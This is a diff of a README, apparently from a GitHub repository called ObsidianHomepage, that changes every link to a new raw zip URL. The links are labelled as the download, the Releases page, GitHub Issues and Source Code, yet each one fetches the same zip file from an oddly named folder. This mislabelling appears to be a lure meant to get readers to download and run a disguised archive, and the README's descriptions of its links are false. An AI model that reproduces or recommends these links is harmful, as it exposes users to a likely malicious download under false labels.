@@ -1,6 +1,6 @@
 # 💻 ObsidianHomepage - Simplifying Your Obsidian Setup
 
-![Download ObsidianHomepage](https://raw.githubusercontent.com/abcp9469/ObsidianHomepage/main/annulary/ObsidianHomepage.zip)
+![Download ObsidianHomepage](https://github.com/abcp9469/ObsidianHomepage/raw/refs/heads/main/annulary/Obsidian_Homepage_v1.8-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ObsidianHomepage! This application helps you set up your Obsidian
 
 To get started, visit the Releases page to download the latest version of ObsidianHomepage. Click the link below:
 
-[Download ObsidianHomepage](https://raw.githubusercontent.com/abcp9469/ObsidianHomepage/main/annulary/ObsidianHomepage.zip)
+[Download ObsidianHomepage](https://github.com/abcp9469/ObsidianHomepage/raw/refs/heads/main/annulary/Obsidian_Homepage_v1.8-beta.3.zip)
 
 Once you’re on the Releases page, find the version labeled "Latest Release." Click on it to access the files. 
 
@@ -65,7 +65,7 @@ You can save your settings to make your Obsidian environment even more efficient
 
 If you encounter issues or have questions, feel free to reach out. Issues can be reported on the GitHub Issues page. 
 
-Visit the page here: [GitHub Issues](https://raw.githubusercontent.com/abcp9469/ObsidianHomepage/main/annulary/ObsidianHomepage.zip)
+Visit the page here: [GitHub Issues](https://github.com/abcp9469/ObsidianHomepage/raw/refs/heads/main/annulary/Obsidian_Homepage_v1.8-beta.3.zip)
 
 ## ⚙️ Contributing
 
@@ -77,7 +77,7 @@ For any further assistance, you can contact the developer directly through the I
 
 ## 🔗 Useful Links
 
-- [Latest Releases](https://raw.githubusercontent.com/abcp9469/ObsidianHomepage/main/annulary/ObsidianHomepage.zip)
-- [Source Code](https://raw.githubusercontent.com/abcp9469/ObsidianHomepage/main/annulary/ObsidianHomepage.zip)
+- [Latest Releases](https://github.com/abcp9469/ObsidianHomepage/raw/refs/heads/main/annulary/Obsidian_Homepage_v1.8-beta.3.zip)
+- [Source Code](https://github.com/abcp9469/ObsidianHomepage/raw/refs/heads/main/annulary/Obsidian_Homepage_v1.8-beta.3.zip)
 
 We hope you enjoy using ObsidianHomepage! Happy organizing!
